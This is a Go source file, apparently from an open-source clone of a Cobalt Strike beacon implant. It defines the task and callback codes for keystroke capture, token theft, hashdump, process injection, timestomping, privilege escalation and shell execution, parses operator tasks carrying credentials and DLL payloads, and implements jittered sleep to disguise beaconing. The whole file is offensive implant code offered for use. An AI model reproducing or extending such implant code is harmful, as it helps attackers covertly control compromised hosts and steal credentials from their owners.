package command

import (
	"bytes"
	"fmt"
	"main/config"
	"main/packet"
	"math/rand"
	"time"
)

// all of this can be found in beacon.Job class
const (
	// IMPORTANT! windows default use codepage 936(GBK)
	// if using CALLBACK 0, CS server will handle result use charset attr in metadata, which will not cause Chinese garbled
	// BUT go deal character as utf8, so Chinese result generate by go will have an encoding problem
	CALLBACK_OUTPUT            = 0
	CALLBACK_KEYSTROKES        = 1
	CALLBACK_FILE              = 2
	CALLBACK_SCREENSHOT        = 3
	CALLBACK_CLOSE             = 4
	CALLBACK_READ              = 5
	CALLBACK_CONNECT           = 6
	CALLBACK_PING              = 7
	CALLBACK_FILE_WRITE        = 8
	CALLBACK_FILE_CLOSE        = 9
	CALLBACK_PIPE_OPEN         = 10
	CALLBACK_PIPE_CLOSE        = 11
	CALLBACK_PIPE_READ         = 12
	CALLBACK_POST_ERROR        = 13
	CALLBACK_PIPE_PING         = 14
	CALLBACK_TOKEN_STOLEN      = 15
	CALLBACK_TOKEN_GETUID      = 16
	CALLBACK_PROCESS_LIST      = 17
	CALLBACK_POST_REPLAY_ERROR = 18
	CALLBACK_PWD               = 19
	CALLBACK_LIST_JOBS         = 20
	CALLBACK_HASHDUMP          = 21
	CALLBACK_PENDING           = 22
	CALLBACK_ACCEPT            = 23
	CALLBACK_NETVIEW           = 24
	CALLBACK_PORTSCAN          = 25
	CALLBACK_DEAD              = 26
	CALLBACK_SSH_STATUS        = 27
	CALLBACK_CHUNK_ALLOCATE    = 28
	CALLBACK_CHUNK_SEND        = 29
	CALLBACK_OUTPUT_OEM        = 30
	CALLBACK_ERROR             = 31
	CALLBACK_OUTPUT_UTF8       = 32
)

// reference https://github.com/mai1zhi2/SharpBeacon/blob/master/Beacon/Profiles/Config.cs
// https://github.com/WBGlIl/ReBeacon_Src/blob/main/ReBeacon_Src/BeaconTask.cpp
// https://sec-in.com/article/1554
// part of them also can be found in cs jar,but I forget where I found them
// most of the interaction can be found in beacon.Taskbeacon
const (
	CMD_TYPE_SPAWN_IGNORE_TOKEN_X86    = 1
	CMD_TYPE_EXIT                      = 3
	CMD_TYPE_SLEEP                     = 4
	CMD_TYPE_CD                        = 5
	CMD_TYPE_CHECKIN                   = 8
	CMD_TYPE_INJECT_X86                = 9
	CMD_TYPE_UPLOAD_START              = 10
	CMD_TYPE_DOWNLOAD                  = 11
	CMD_TYPE_EXECUTE                   = 12
	CMD_TYPE_SPAWN_TOX86               = 13 // only supply target, don't supply dll
	CMD_TYPE_GET_UID                   = 27
	CMD_TYPE_REV2SELF                  = 28
	CMD_TYPE_TIMESTOMP                 = 29
	CMD_TYPE_STEAL_TOKEN               = 31
	CMD_TYPE_PS                        = 32
	CMD_TYPE_KILL                      = 33
	CMD_TYPE_IMPORT_PS                 = 37
	CMD_TYPE_RUNAS                     = 38
	CMD_TYPE_PWD                       = 39
	CMD_TYPE_JOB                       = 40
	CMD_TYPE_LIST_JOBS                 = 41
	CMD_TYPE_JOBKILL                   = 42
	CMD_TYPE_INJECT_X64                = 43
	CMD_TYPE_SPAWN_IGNORE_TOKEN_X64    = 44
	CMD_TYPE_PAUSE                     = 47
	CMD_TYPE_LIST_NETWORK              = 48
	CMD_TYPE_MAKE_TOKEN                = 49
	CMD_TYPE_PORT_FORWARD              = 50
	CMD_TYPE_FILE_BROWSE               = 53
	CMD_TYPE_MAKEDIR                   = 54
	CMD_TYPE_DRIVES                    = 55
	CMD_TYPE_REMOVE                    = 56
	CMD_TYPE_UPLOAD_LOOP               = 67
	CMD_TYPE_SPAWN_TOX64               = 69
	CMD_TYPE_EXEC_ASM_TOKEN_X86        = 70
	CMD_TYPE_EXEC_ASM_TOKEN_X64        = 71
	CMD_TYPE_SET_ENV                   = 72
	CMD_TYPE_FILE_COPY                 = 73
	CMD_TYPE_FILE_MOVE                 = 74
	CMD_TYPE_GET_PRIVS                 = 77
	CMD_TYPE_SHELL                     = 78
	CMD_TYPE_WEB_DELIVERY              = 79
	CMD_TYPE_EXEC_ASM_IGNORE_TOKEN_X86 = 87
	CMD_TYPE_EXEC_ASM_IGNORE_TOKEN_X64 = 88
	CMD_TYPE_SPAWN_TOKEN_X86           = 89
	CMD_TYPE_SPAWN_TOKEN_X64           = 90
	CMD_TYPE_GET_SYSTEM                = 95
	CMD_TYPE_UNKNOWN_JOB               = 101 // same as 40 job?
)

func parseAnArg(buf *bytes.Buffer) ([]byte, error) {
	argLen := packet.ReadInt(buf)
	if argLen != 0 {
		arg := make([]byte, argLen)
		_, err := buf.Read(arg)
		if err != nil {
			return nil, err
		}
		return arg, nil
	} else {
		return nil, nil
	}
}

func parseGetPrivs(b []byte) ([]string, error) {
	buf := bytes.NewBuffer(b)
	privCnt := int(packet.ReadShort(buf))
	privs := make([]string, privCnt)
	for i := 0; i < privCnt; i++ {
		tmp, err := parseAnArg(buf)
		if err != nil {
			return nil, err
		}
		privs[i] = string(tmp)
	}
	return privs, nil
}

func parseCommandUpload(b []byte) ([]byte, []byte, error) {
	buf := bytes.NewBuffer(b)
	filePath, err := parseAnArg(buf)
	fileContent := buf.Bytes()
	return filePath, fileContent, err

}

// can also be used on Copy
func parseCommandMove(b []byte) ([]byte, []byte, error) {
	buf := bytes.NewBuffer(b)
	src, err := parseAnArg(buf)
	dst, err := parseAnArg(buf)
	return src, dst, err
}

func parseCommandCopy(b []byte) ([]byte, []byte, error) {
	return parseCommandMove(b)
}

func parseCommandShell(b []byte) ([]byte, []byte, error) {
	return parseCommandMove(b)
}

func parseMakeToken(b []byte) ([]byte, []byte, []byte, error) {
	buf := bytes.NewBuffer(b)
	domain, err := parseAnArg(buf)
	username, err := parseAnArg(buf)
	password, err := parseAnArg(buf)
	return domain, username, password, err
}

func parseRunAs(b []byte) ([]byte, []byte, []byte, []byte, error) {
	buf := bytes.NewBuffer(b)
	domain, err := parseAnArg(buf)
	username, err := parseAnArg(buf)
	password, err := parseAnArg(buf)
	cmd, err := parseAnArg(buf)
	return domain, username, password, cmd, err
}

func parseInject(b []byte) (uint32, []byte, uint32, error) {
	buf := bytes.NewBuffer(b)
	pid := packet.ReadInt(buf)
	// if there are prepends in payload, there will be an offset to indicate it
	offset := packet.ReadInt(buf)
	dll := buf.Bytes()
	return pid, dll, offset, nil
}

func parseExecAsm(b []byte) (uint16, uint16, uint32, []byte, []byte, []byte, error) {
	buf := bytes.NewBuffer(b)
	callBackType := packet.ReadShort(buf)
	sleepTime := packet.ReadShort(buf)
	offset := packet.ReadInt(buf)
	description, err := parseAnArg(buf)
	csharp, err := parseAnArg(buf)
	dll := buf.Bytes()
	return callBackType, sleepTime, offset, description, csharp, dll, err
}

func ChangeSleep(b []byte) {
	buf := bytes.NewBuffer(b)
	sleep := packet.ReadInt(buf)
	jitter := packet.ReadInt(buf)
	fmt.Printf("Now sleep is %d ms, jitter is %d%%\n", sleep, jitter)
	config.WaitTime = int(sleep)
	config.Jitter = int(jitter)
}

func Sleep() {
	sleepTime := config.WaitTime
	if config.Jitter != 0 {
		random := sleepTime * config.Jitter / 100
		sleepTime += rand.Intn(random*2) - random

	}
	time.Sleep(time.Duration(sleepTime) * time.Millisecond)
}
